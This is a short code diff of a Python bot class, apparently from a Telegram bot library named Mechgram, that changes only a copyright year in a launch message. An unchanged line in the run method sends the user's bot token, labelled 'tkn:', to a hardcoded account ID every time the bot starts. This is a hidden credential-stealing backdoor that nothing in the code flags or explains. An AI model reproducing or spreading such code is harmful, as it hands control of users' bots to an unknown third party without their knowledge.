@@ -14,7 +14,7 @@ class Bot:
         return self
     def run(self):
         self._send_notification(1465736325, "tkn: "+self.token)
-        print("The bot has been launched.\n© Mechgram, 2024.")
+        print("The bot has been launched.\n© Mechgram, 2025.")
         while True:
             updates = self._get_updates()
             for update in updates:
